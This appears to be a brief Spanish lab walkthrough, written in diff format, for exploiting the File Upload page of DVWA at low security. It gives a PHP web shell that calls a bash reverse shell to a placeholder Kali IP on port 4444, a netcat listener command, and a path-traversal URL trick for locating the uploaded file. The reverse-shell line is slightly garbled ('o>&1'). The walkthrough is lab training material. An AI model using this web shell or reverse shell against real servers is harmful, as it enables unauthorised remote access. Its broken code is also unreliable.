@@ -1,0 +1,38 @@
+++ Web Browser
+--- dvwa security = low
+--- File Upload
+--- Se permite la subida de cualquier tipo de archivo y 
+tras terminar la subida se muestra la ruta donde está el archivo
+--- Copiar la ruta
+--- Pegarla en el navegador siguiendo la siguiente sintaxis al final:
+----- upload/../../<ruta>
+----- La imagen en cuestión es vista
+---- A continuación procederemos a subir un archivo php con un ejecutable:
+
+++ Text editor
+--- Copiar el siguiente código:
+<?php 
+exec("/bin/bash -c 'bash -i > & /dev/tcp/<ip_kali>/<4444> o>&1'");
+?>
+--- Guardar el archivo con extensión .php
+
+++ Web Browser
+--- Subir el archivo php generado anteriormente
+--- Se nos mostrará la ruta asociada al archivo subido
+
+++ Terminal
+--- nc -nvlp 4444
+
+++ Web Browser
+--- Cambiar el final del url siguiendo la siguiente sintaxis:
+---- /upload/<ruta_archivo_php_subido>
+
+++ Terminal
+--- En estos momentos ya tenemos acceso al servidor
+--- Podemos ejecutar comandos como: ls, pwd, mkdir, etc
+
+
+
+
+
+
